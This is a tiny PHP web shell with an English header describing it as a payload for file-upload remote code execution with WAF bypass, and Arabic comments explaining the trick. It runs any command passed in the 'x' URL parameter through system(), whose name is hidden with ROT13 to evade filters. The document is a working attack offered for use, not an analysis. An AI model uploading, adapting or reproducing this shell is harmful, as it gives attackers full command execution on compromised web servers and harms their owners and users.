# This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using php lang with bypass WAF ( The section follows the RCE Bug )

<?php
// استخدام التشفير لتجاوز الـ WAF
$a = str_rot13('flfgrz'); // الكلمة مشفرة (system)
$b = $_GET['x'];
$a($b);
?>
